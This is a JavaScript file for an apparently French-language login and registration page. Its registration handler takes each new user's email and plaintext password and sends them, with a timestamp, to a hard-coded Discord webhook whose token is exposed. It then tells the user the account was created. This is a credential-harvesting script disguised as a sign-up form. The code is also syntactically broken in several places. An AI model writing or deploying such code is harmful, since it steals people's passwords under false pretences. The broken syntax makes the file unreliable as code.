document.getElementById("show-register").addEventListener("click", function(event) {
    event.preventDefault();
    document.getElementById("login-form").style.display = "none";
    document.getElementById("register-form").style.display = "block";
    document.getElementById("form-title").textContent = "Inscription";
});

document.getElementById("show-login").addEventListener("click", function(event) {
    event.preventDefault();
    document.getElementById("register-form").style.display = "none";
    document.getElementById("login-form").style.display = "block";
    document.getElementById("form-title").textContent = "Connexion";
});

document.getElementById("register-form").addEventListener("submit" function(event) {
    event.preventDefault();

    let username = document.getElementById("register-username").value;
    let email = document.getElementById("register-email").value;
    let password = document.getElementById("register-password").value;

    let now = new Date();
    let date = now.toLocaleDateString("fr-FR");
    let time = now.toLocaleTimeString("fr-FR");

    let webhookURL = "https://discord.com/api/webhooks/1351931586030862346/j17pqAZlVY8paawnsj4yHsEWlQfVuL3juYDf3lds0N4bu7CHWWQFylBk8ty6LSmfqLqM";
    
    let message = {
        content: `**Un nouveau compte a été créé :**\n\n✉️ **Nom d'utilisateur / Email :****§{email}\n🔑 **Mot de passe :** ${password}\n📅 **Créé le :** ${date} à ${time}`
});

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        alert("Compte créé avec succès !")
        document.getElementById("register-form").reset();
    })

.catch(error => {{
    console.error("Erreur :" error):
    alert("Impossible de contacter le serveur.")
}});
